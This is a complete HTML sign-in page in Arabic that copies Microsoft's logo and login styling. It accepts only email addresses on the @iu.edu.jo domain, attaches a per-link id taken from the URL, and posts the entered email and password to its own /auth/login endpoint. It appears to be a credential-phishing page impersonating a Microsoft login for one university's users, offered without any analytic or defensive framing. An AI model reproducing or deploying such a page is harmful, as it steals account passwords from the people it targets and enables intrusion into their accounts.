<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
    }
    .form-control {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      text-align: left;
      direction: ltr;
    }
    button {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #005a9e;
    }
    .error-message {
      background: #fde7e9;
      color: #a80000;
      border: 1px solid #d13438;
      padding: 10px;
      border-radius: 4px;
      margin-top: 10px;
      font-size: 14px;
      display: none; /* افتراضياً مخفية */
      text-align: left;
      direction: rtl;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
    <h2>تسجيل الدخول</h2>
    <form id="loginForm" method="POST">
      <input type="email" id="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
      <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
      <input type="hidden" id="linkId" name="id">
      <button type="submit">تسجيل الدخول</button>
    </form>
    <div id="errorBox" class="error-message">❌ يجب إدخال بريد ينتهي بـ ‎@iu.edu.jo</div>
  </div>

  <script>
    // التقاط linkId من رابط الصفحة (مثل /auth/login?id=xxxx)
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    // معالجة إرسال النموذج
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault(); // منع الإرسال التقليدي

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const id = document.getElementById('linkId').value;

      // تحقق من النطاق
      if (!email.endsWith('@iu.edu.jo')) {
        document.getElementById('errorBox').style.display = 'block';
        return;
      }

      // إرسال الطلب إلى السيرفر
      const res = await fetch('/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, id })
      });

      if (res.redirected) {
        // إعادة التوجيه للرابط المحمي
        window.location.href = res.url;
      } else {
        const msg = await res.text();
        document.getElementById('errorBox').innerText = msg;
        document.getElementById('errorBox').style.display = 'block';
      }
    });
  </script>
</body>
</html>
